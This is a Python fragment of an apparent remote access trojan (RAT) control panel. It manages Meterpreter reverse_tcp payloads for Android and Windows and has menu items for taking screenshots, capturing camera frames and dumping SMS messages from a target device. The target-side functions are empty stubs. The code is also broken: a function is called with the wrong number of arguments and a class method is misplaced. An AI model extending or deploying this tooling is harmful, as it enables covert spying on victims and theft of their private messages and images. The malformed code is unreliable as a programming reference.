def create_payload_with_name(payload_type, name):
    """
    Create a named payload based on type
    """
    payload_map = {
        "android": f"{payload_type}/meterpreter/reverse_tcp",
        "windows": f"windows/{payload_type}/reverse_tcp"
    }
    
    if payload_type not in payload_map:
        raise ValueError(f"Unsupported payload type: {payload_type}")
        
    return name + "_" + payload_map[payload_type]

def check_payload_exists(name):
    """Check if payload exists on target device"""
    # Implementation depends on target platform
    pass

def delete_payload(name):
    """Delete payload from target device"""
    # Implementation depends on target platform
    pass

def handle_payload_operation(action, payload_name=None):
    """
    Handle payload operations: create, enable/disable, check status
    """
    options = ["create", "enable", "disable", "status"]
    if action not in options:
        print(f"Invalid operation: must be one of {options}")
        return False
        
    if action == "create":
        if not payload_name:
            print("Payload name required for creation")
            return False
        # Create payload with specified name
        create_payload_with_name(payload_name)
        return True
        
    elif action == "status":
        # Check if payload exists
        if check_payload_exists(payload_name):
            print(f"Payload '{payload_name}' exists on target")
        else:
            print(f"No payload found with name '{payload_name}'")
        return True
        
    elif action == "enable" or action == "disable":
        if not payload_name:
            print("Payload name required for enable/disable")
            return False
            
        if action == "enable":
            # Re-enable disabled payload
            print(f"Enabling payload: {payload_name}")
        else:
            # Disable payload without deleting it
            print(f"Disabling payload: {payload_name}")
        return True
    
    else:
        print("Unknown operation")
        return False

# Update RAT control panel menu
    def run_rat_control_panel(self):
        print("\n=== RAT Control Panel ===")
        print("1. Manage Payloads")
        print("2. Take Screenshot")
        print("3. Capture Camera Frame")
        print("4. Dump SMS Messages")
        print("5. Exit Control Panel")
        
        while True:
            choice = input("Select an option: ")
            
            if choice == "1":
                self.manage_payloads()
            elif choice == "2":
                self.take_screenshot()
            elif choice == "3":
                self.capture_camera_frame()
            elif choice == "4":
                self.dump_sms_messages()
            elif choice == "5":
                break
            else:
                print("Invalid option. Please try again.")

    def manage_payloads(self):
        print("\n=== Payload Management ===")
        print("1. Create New Payload")
        print("2. Enable/Disable Payload")
        print("3. Delete Existing Payload")
        print("4. Back")
        
        while True:
            choice = input("Select an option: ")
            
            if choice == "1":
                name = input("Enter payload name: ")
                handle_payload_operation("create", name)
            elif choice == "2":
                name = input("Enter payload name: ")
                action = input("Enable or disable? (enable/disable): ").lower()
                handle_payload_operation(action, name)
            elif choice == "3":
                name = input("Enter payload name: ")
                confirm = input(f"Are you sure you want to delete payload '{name}'? (yes/no): ")
                if confirm.lower() == "yes":
                    delete_payload(name)
            elif choice == "4":
                return
            else:
                print("Invalid option. Please try again.")